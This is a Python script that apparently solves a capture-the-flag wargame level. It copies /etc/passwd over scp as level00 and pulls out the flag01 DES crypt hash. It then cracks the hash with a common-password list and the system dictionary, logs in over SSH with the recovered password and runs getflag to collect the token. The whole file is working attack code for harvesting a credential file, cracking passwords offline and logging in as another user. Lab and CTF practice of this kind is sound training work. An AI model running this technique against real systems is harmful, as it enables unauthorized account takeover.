import sys
import os
import tempfile
from pathlib import Path
from passlib.context import CryptContext

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag

des_ctx = CryptContext(schemes=["des_crypt"], deprecated="auto")


def crack_hash(target):
    """Crack DES hash via dictionary attack."""
    salt = target[:2]
    common = [
        "abcdefg",
        "password",
        "123456",
        "admin",
        "test",
        "root",
        "flag01",
        "level01",
    ]
    print(f"[*] Target: {target} | Salt: {salt}\n")

    for pwd in common:
        if des_ctx.hash(pwd[:8], salt=salt) == target:
            print(f"[+] FOUND: {pwd}")
            return pwd
        print(f"    [-] {pwd}")

    print("[*] Wordlist phase...")
    try:
        for word in open("/usr/share/dict/words"):
            word = word.strip()[:8]
            if des_ctx.hash(word, salt=salt) == target:
                print(f"[+] FOUND: {word}")
                return word
    except:
        pass
    return None


def exploit():
    """Execute hash cracking and retrieve token."""
    print("[*] Reading level00 token...")
    try:
        print(f"[+] Level00 Token: {read_flag(0)}")
    except:
        print("[-] Could not read level00 token")
        return False, "", ""

    print("[*] Retrieving flag01 hash from /etc/passwd...")
    with tempfile.TemporaryDirectory() as tmpdir:
        passwd_file = os.path.join(tmpdir, "passwd")
        if not scp_cmd(
            "localhost", 4242, "level00", "level00", "/etc/passwd", passwd_file
        ):
            print("[-] Failed to copy /etc/passwd")
            return False, "", ""

        with open(passwd_file) as f:
            for line in f:
                if line.startswith("flag01:"):
                    hash_val = line.split(":")[1]
                    print(f"[+] Hash extracted: {hash_val}")
                    pwd = crack_hash(hash_val)
                    if not pwd:
                        print("[-] Password not found")
                        return False, "", ""

                    print(f"\n[+] Cracked: {pwd}\n[*] Connecting to flag01...")
                    code, out, _ = ssh_cmd("localhost", 4242, "flag01", pwd, "getflag")
                    if code == 0 and "token" in out.lower():
                        print(f"[+] Success!\n{out}")
                        return True, out.split(":")[-1].strip(), pwd
                    print("[!] Failed")
                    return False, "", ""

    print("[-] flag01 entry not found")
    return False, "", ""


def main():
    success, token, password = exploit()
    if success:
        save_flag(1, token)
        print(f"[ANSWER]\n  Flag01 Password: {password}\n  Level01 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
